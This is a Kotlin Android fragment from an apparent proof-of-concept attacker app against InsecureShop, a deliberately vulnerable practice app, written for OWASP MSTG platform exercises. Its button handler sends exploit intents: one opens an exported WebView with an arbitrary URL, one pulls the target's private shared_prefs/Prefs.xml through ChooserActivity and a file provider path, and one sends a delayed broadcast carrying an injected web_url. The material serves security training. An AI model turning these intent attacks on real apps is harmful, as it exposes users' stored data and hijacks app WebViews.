package com.websarva.wings.android.insecureshoppoc.ui.fragment.platform

import android.annotation.SuppressLint
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.Toast
import androidx.fragment.app.Fragment
import com.websarva.wings.android.insecureshoppoc.R
import com.websarva.wings.android.insecureshoppoc.databinding.FragmentPlatform2Binding
import com.websarva.wings.android.insecureshoppoc.ui.fragment.InfoDialogFragment
import dagger.hilt.android.AndroidEntryPoint

@AndroidEntryPoint
class Platform2Fragment: Fragment() {
    private var _binding: FragmentPlatform2Binding? = null
    private val binding
    get() = _binding!!

    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        _binding = FragmentPlatform2Binding.inflate(inflater, container, false)

        return binding.root
    }

    @SuppressLint("SdCardPath")
    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)

        // defaultのRadioButtonをcheck
        binding.rb1.isChecked = true

        // radioButtonが変更される度にcalled
        binding.radioGroup.setOnCheckedChangeListener { _, id ->
            when(id){
                binding.rb1.id -> {
                    // buttonテキストの変更
                    binding.button.text = getString(R.string.mstg_platform_2_bt_display)
                    // checkBoxを非表示
                    binding.cb2.visibility = View.GONE
                    binding.cb3.visibility = View.GONE
                }
                binding.rb2.id -> {
                    // buttonテキストの変更
                    binding.button.text = getString(R.string.mstg_platform_2_bt_attack)
                    // checkBoxを表示
                    binding.cb2.visibility = View.VISIBLE
                    binding.cb3.visibility = View.GONE
                }
                binding.rb3.id -> {
                    // buttonテキストの変更
                    binding.button.text = getString(R.string.mstg_platform_2_bt_attack)
                    // checkBoxを表示
                    binding.cb2.visibility = View.GONE
                    binding.cb3.visibility = View.VISIBLE
                }
                binding.rb4.id -> {
                    // buttonテキストの変更
                    binding.button.text = getString(R.string.mstg_platform_2_bt_attack)
                    // checkBoxを非表示
                    binding.cb2.visibility = View.GONE
                    binding.cb3.visibility = View.GONE
                }
                else -> {
                    throw IllegalArgumentException("Out of range of the array.")
                }
            }
        }

        // buttonがタップされた時の処理
        binding.button.setOnClickListener {
            when(binding.radioGroup.checkedRadioButtonId){
                binding.rb1.id -> {
                    activity?.let {
                        InfoDialogFragment(getString(R.string.mstg_platform_2_title), getString(R.string.mstg_platform_2_1_message)).show(it.supportFragmentManager, "InfoDialog")
                    }
                }
                binding.rb2.id -> {
                    if (binding.cb2.isChecked){
                        activity?.let {
                            InfoDialogFragment(getString(R.string.mstg_platform_2_title), getString(R.string.mstg_platform_2_2_message)).show(it.supportFragmentManager, "InfoDialog")
                        }
                    }else{
                        // intentの定義
                        val intent = Intent("com.insecureshop.action.WEBVIEW").apply {
                            data = Uri.parse("http://example.com")
                            setClassName("com.insecureshop", "com.insecureshop.WebView2Activity")
                        }
                        // 対象アクティビティの起動
                        startActivity(intent)
                    }
                }
                binding.rb3.id -> {
                    // intentの定義
                    // API < 29
                    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.P){
                        val intent = Intent(Intent.ACTION_VIEW).apply {
                            putExtra(Intent.EXTRA_STREAM, Uri.parse(
                                if (binding.cb3.isChecked){
                                    "content://com.insecureshop.file_provider/root/data/data/com.insecureshop/shared_prefs/Prefs.xml"
                                }else{
                                    "/data/data/com.insecureshop/shared_prefs/Prefs.xml"
                                }
                            ))
                            setClassName("com.insecureshop", "com.insecureshop.ChooserActivity")
                        }
                        // 対象アクティビティの起動
                        startActivity(intent)
                    }else{
                        Toast.makeText(activity, getString(R.string.mstg_platform_2_3_toast_error), Toast.LENGTH_SHORT).show()
                    }
                }
                binding.rb4.id -> {
                    // Activityを先に起動させる
                    val intent = Intent().apply {
                        setClassName("com.insecureshop", "com.insecureshop.AboutUsActivity")
                    }
                    startActivity(intent)

                    // 0.5秒後に攻撃を開始
                    Handler(Looper.myLooper()!!).postDelayed({
                        val broadIntent = Intent("com.insecureshop.CUSTOM_INTENT").apply {
                            putExtra("web_url", "http://example.com")
                        }
                        // broadcastを送信
                        activity?.sendBroadcast(broadIntent)
                    }, 500)
                }
                else -> {
                    throw IllegalArgumentException("Out of range of the array.")
                }
            }
        }
    }

    override fun onDestroyView() {
        _binding = null

        super.onDestroyView()
    }
}